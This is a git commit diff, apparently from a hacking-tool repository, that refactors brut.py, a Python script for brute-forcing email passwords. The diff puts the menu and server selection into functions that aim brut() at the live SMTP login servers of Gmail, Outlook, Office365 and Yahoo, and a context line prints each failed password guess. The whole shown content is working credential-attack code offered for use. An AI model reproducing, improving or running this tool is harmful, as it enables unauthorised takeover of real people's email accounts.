0e88b8f892dbfcb494575f447e78336c54ed424e
EgyptHack <53131186+dzhacker1212@users.noreply.github.com>
2020-07-12 20:06:41 +0200

    Update brut.py

--- brut.py
+++ brut.py
@@ -20,22 +20,26 @@ def brut(smtp, port):
             except smtplib.SMTPAuthenticationError:
                 print(f"[!] Can Not Found Password [!] >>>>>>> {Password}")
 
+def banner():
+    print("""
+    1- gmail
+    2- outlook
+    3- office
+    4- yahoo
+    """
+    )
 
-print("""
-1- gmail
-2- outlook
-3- office
-4- yahoo
-"""
-)
+def check(choose):
+    if choose == '1':
+        brut("smtp.gmail.com", 587)
+    elif choose == '2':
+        brut("smtp.live.com", 587)
+    elif choose == '3':
+        brut("smtp.office365.com", 587)
+    elif choose == '4':
+        brut("smtp.mail.yahoo.com", 465)
+    else:
+        print(f"I Can't Find This {choose}")
+
 choose = input("Enter Number: ")
-if choose == '1':
-    brut("smtp.gmail.com", 587)
-elif choose == '2':
-    brut("smtp.live.com", 587)
-elif choose == '3':
-    brut("smtp.office365.com", 587)
-elif choose == '4':
-    brut("smtp.mail.yahoo.com", 465)
-else:
-    print(f"I Can't Find This {choose}")
+check(choose)
